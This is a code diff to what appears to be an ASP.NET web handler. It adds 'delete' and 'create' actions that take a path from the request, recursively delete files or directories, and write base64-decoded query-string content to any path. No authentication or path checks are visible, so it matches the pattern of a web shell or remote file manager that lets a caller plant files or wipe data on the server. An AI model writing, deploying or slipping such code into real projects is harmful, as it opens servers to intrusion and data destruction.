@@ -82,6 +82,75 @@ try
 				Response.Write("Access denied.");
 			}
 			break;
+        
+        case "delete":
+            try
+            {
+                if (File.Exists(path))
+                {
+                    File.Delete(path);
+                    Response.Write("File deleted");
+                }
+                else if (Directory.Exists(path))
+                {
+                    Directory.Delete(path, true);
+                    Response.Write("Directory deleted");
+                }
+                else
+                {
+                    Response.Write("File or directory not found");
+                }
+            }
+            catch (FormatException)
+            {
+                Response.Write("Invalid Base64");
+            }
+            catch (UnauthorizedAccessException)
+            {
+                Response.Write("Access denied.");
+            }
+            break;
+
+        case "create":
+            try
+            {
+                if (File.Exists(path) || Directory.Exists(path))
+                {
+                    Response.Write("File or directory already exists");
+                    return;
+                }
+
+                if (path.EndsWith("/"))
+                {
+                    Directory.CreateDirectory(path);
+                    Response.Write("Directory created");
+                }
+                else
+                {
+                    File.Create(path).Close();
+                    
+                    String b64content = Request.QueryString["content"];
+
+                    String content = Encoding.UTF8.GetString(Convert.FromBase64String(b64content));
+
+
+                    if (!string.IsNullOrEmpty(content))
+                    {
+                        File.WriteAllText(path, content);
+                    }
+
+                    Response.Write("File created");
+                }
+            }
+            catch (FormatException)
+            {
+                Response.Write("Invalid Base64");
+            }
+            catch (UnauthorizedAccessException)
+            {
+                Response.Write("Access denied.");
+            }
+            break;
 
         default:
             Response.Write("Invalid action");
